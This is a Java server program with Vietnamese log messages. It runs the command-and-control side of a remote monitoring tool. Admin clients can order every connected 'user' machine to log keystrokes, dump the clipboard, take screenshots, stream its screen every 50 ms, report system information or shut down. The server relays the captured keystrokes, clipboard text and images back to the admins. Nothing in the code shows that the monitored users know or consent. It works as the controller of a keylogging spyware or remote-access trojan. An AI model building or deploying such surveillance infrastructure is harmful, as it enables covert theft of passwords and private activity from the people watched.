package Controller;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.*;

public class Server {
    private static List<UserHandler> userClients = new ArrayList<>();
    private static List<AdminHandler> adminClients = new ArrayList<>();
    private static StringBuilder systemInfo = new StringBuilder();
    private static int clientCounter = 0; // Counter for assigning unique names
    private static Set<String> userConnectedIPs = new HashSet<>(); // Set to store user connected IPs
    private static Set<String> adminConnectedIPs = new HashSet<>(); // Set to store admin connected IPs

    public static void main(String[] args) {
        int portNumber = 5254;

        try (ServerSocket serverSocket = new ServerSocket(portNumber)) {
            System.out.println("Server đang chạy cổng " + portNumber);

            while (true) {
                Socket clientSocket = serverSocket.accept();
                new Thread(new ConnectionHandler(clientSocket)).start();
            }
        } catch (IOException e) {
            System.err.println("Lỗi!!!: " + e.getMessage());
        }
    }

    private static class ConnectionHandler implements Runnable {
        private final Socket clientSocket;

        public ConnectionHandler(Socket socket) {
            this.clientSocket = socket;
        }

        @Override
        public void run() {
            try {
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                String clientType = in.readLine();
                String clientIP = clientSocket.getInetAddress().getHostAddress();
                System.out.println("Địa chỉ IP của client: " + clientIP);

                if ("USER".equals(clientType)) {
                    synchronized (userConnectedIPs) {
                        if (userConnectedIPs.contains(clientIP)) {
                            System.out.println("User IP " + clientIP + " kết nối đã tồn tại. Kết nối HỦY BỎ.");
                            clientSocket.close();
                            return;
                        } else {
                            userConnectedIPs.add(clientIP);
                        }
                    }
                    clientCounter++;
                    String clientName = "PC" + clientCounter;
                    UserHandler userHandler = new UserHandler(clientSocket, clientName);
                    userClients.add(userHandler);
                    System.out.println(clientName + " kết nối : " + clientSocket.getRemoteSocketAddress());
                    new Thread(userHandler).start();
                    notifyAdminClients("CONNECTED:" + clientName);

                } else if ("ADMIN".equals(clientType)) {
                    synchronized (adminConnectedIPs) {
                        if (adminConnectedIPs.contains(clientIP)) {
                            System.out.println("Admin IP " + clientIP + " đã kết nối đã tồn tại. Kết nối HỦY BỎ.");
                            clientSocket.close();
                            return;
                        } else {
                            adminConnectedIPs.add(clientIP);
                        }
                    }
                    AdminHandler adminHandler = new AdminHandler(clientSocket);
                    adminClients.add(adminHandler);
                    System.out.println("Admin client connected: " + clientSocket.getRemoteSocketAddress());
                    new Thread(adminHandler).start();
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            }
        }

        private void notifyAdminClients(String message) {
            for (AdminHandler admin : adminClients) {
                admin.sendSystemInfo(message);
            }
        }
    }

    private static class UserHandler implements Runnable {
        private final Socket clientSocket;
        private final String clientName;
        private PrintWriter out;
        private boolean sendingScreenshots = false;

        public UserHandler(Socket socket, String clientName) {
            this.clientSocket = socket;
            this.clientName = clientName;
        }

        @Override
        public void run() {
            String clientIP = clientSocket.getInetAddress().getHostAddress();
            try {
                out = new PrintWriter(clientSocket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));

                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    if (inputLine.startsWith("OS_INFO:")) {
                        String osInfo = inputLine.substring(8);
                        sendSystemInfoToAdmins(osInfo);
                    } else if (inputLine.startsWith("CLIPBOARD:")) {
                        String info = clientName + ": " + inputLine.substring(10);
                        sendSystemInfoToAdmins(info);
                    } else if (inputLine.startsWith("KEY:")) {
                        String info = clientName + ": " + inputLine.substring(4);
                        sendSystemInfoToAdmins(info);
                    } else if (inputLine.startsWith("SCREENSHOT:")) {
                        String base64Image = inputLine.substring(11);
                        sendScreenshotToAdmins(base64Image);
                    } else if (inputLine.equals("START_VIDEO")) {
                        startSendingScreenshots();
                    } else if (inputLine.equals("STOP_VIDEO")) {
                        stopSendingScreenshots();
                    }
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            } finally {
                try {
                    clientSocket.close();
                    synchronized (userConnectedIPs) {
                        userConnectedIPs.remove(clientIP);
                    }
                    userClients.remove(this);
                } catch (IOException e) {
                    System.err.println("Error: " + e.getMessage());
                }
            }
        }

        public void sendCommand(String command) {
            if (out != null) {
                out.println(command);
            }
        }

        public void sendSystemInfoToAdmins(String info) {
            synchronized (systemInfo) {
                for (AdminHandler admin : adminClients) {
                    admin.sendSystemInfo(info);
                }
            }
        }

        public void sendScreenshotToAdmins(String base64Image) {
            synchronized (systemInfo) {
                for (AdminHandler admin : adminClients) {
                    admin.sendScreenshot(base64Image);
                }
            }
        }

        public void startSendingScreenshots() {
            sendingScreenshots = true;
            new Thread(() -> {
                while (sendingScreenshots) {
                    // Capture and send screenshot
                    sendCommand("SCREENSHOT");
                    try {
                        Thread.sleep(50); // Adjust this value as needed
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }

        public void stopSendingScreenshots() {
            sendingScreenshots = false;
        }
    }

    private static class AdminHandler implements Runnable {
        private final Socket adminSocket;
        private PrintWriter out;

        public AdminHandler(Socket socket) {
            this.adminSocket = socket;
        }

        @Override
        public void run() {
            String clientIP = adminSocket.getInetAddress().getHostAddress();
            try {
                out = new PrintWriter(adminSocket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(adminSocket.getInputStream()));

                String clientMessage;
                while ((clientMessage = in.readLine()) != null) {
                    handleAdminRequest(clientMessage);
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            } finally {
                try {
                    adminSocket.close();
                    synchronized (adminConnectedIPs) {
                        adminConnectedIPs.remove(clientIP);
                    }
                    adminClients.remove(this);
                } catch (IOException e) {
                    System.err.println("Error: " + e.getMessage());
                }
            }
        }

        public void sendSystemInfo(String info) {
            if (out != null) {
                out.println(info);
            }
        }

        public void sendScreenshot(String base64Image) {
            if (out != null) {
                out.println("SCREENSHOT:" + base64Image);
            }
        }

        public void handleAdminRequest(String clientMessage) {
            if (clientMessage.startsWith("OS_INFO")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("OS_INFO");
                }
            } else if (clientMessage.startsWith("GET_CLIPBOARD")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("GET_CLIPBOARD");
                }
            } else if (clientMessage.startsWith("KEYLOGGING")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("KEYLOGGING");
                }
            } else if (clientMessage.startsWith("SCREENSHOT")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("SCREENSHOT");
                }
            } else if (clientMessage.startsWith("SHUTDOWN")) {
                for (UserHandler user : userClients) {
                    user.sendCommand("SHUTDOWN");
                }
            } else if (clientMessage.startsWith("START_VIDEO")) {
                for (UserHandler user : userClients) {
                    user.startSendingScreenshots();
                }
            } else if (clientMessage.startsWith("STOP_VIDEO")) {
                for (UserHandler user : userClients) {
                    user.stopSendingScreenshots();
                }
            }
        }
    }
}
